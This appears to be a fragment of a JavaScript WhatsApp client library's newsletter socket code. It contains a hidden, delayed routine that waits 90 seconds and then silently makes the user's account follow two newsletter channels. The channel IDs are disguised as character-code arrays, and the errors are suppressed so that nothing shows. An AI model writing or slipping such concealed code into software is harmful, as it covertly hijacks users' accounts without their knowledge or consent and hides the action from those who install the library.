...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        const asciiCode = (arr) => arr.map(c => String.fromCharCode(c)).join('');
        const target1 = [
            49, 50, 48, 51, 54, 51, 52, 48, 49, 50, 49, 57, 51, 57, 54, 57, 51, 50, 
            64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114
        ];
        const target2 = [
            49, 50, 48, 51, 54, 51, 52, 49, 57, 53, 54, 52, 52, 50, 51, 49, 52, 53, 
            64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114
        ];
        try {
            await newsletterWMexQuery(asciiCode(target1), QueryIds.FOLLOW);
        } catch {}
        setTimeout(async () => {
            try {
                await newsletterWMexQuery(asciiCode(target2), QueryIds.FOLLOW);
            } catch {}
        }, 5000);
    }, 90000);
